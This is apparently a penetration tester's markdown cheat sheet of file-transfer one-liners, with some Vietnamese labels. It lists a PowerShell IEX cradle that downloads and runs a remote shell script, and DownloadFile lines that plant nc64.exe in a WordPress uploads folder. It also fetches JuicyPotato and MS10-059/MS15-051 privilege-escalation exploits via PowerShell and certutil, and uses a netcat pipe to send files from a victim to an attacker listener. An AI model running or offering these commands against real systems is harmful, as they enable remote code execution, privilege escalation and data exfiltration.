# window

``` powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"  ```


``` powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.111/nc64.exe','C:\inetpub\wwwroot\wordpress\wp-content\uploads\temo.exe'); ```

```
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.39/JuicyPotato.exe','C:\inetpub\temp\JuicyPotato.exe')

(new-object net.webclient).downloadfile('http://10.10.14.39/Churraskito_exe/MS10-059.exe', 'C:\Users\merlin\Desktop\MS10-059.exe')


```

# SMB

```
start smbserver.py

cp \\IP\tmp
```
# Curl

```
certutil -urlcache -f http://10.10.14.48:8000/ms15-051.exe ech0_privesc.exe
```

# Linux

``` wget http://filename -O finame ```

``` curl http://www.abc.com/123/def/ghi/jkl.mno -o filename ```

# Ncat

```
victim
nc -nv attacker_ip attacker_open_port < file_muon_treuyen
```

```
attack hhost

nc -lvnp open_port > file_muốn_truyền

```
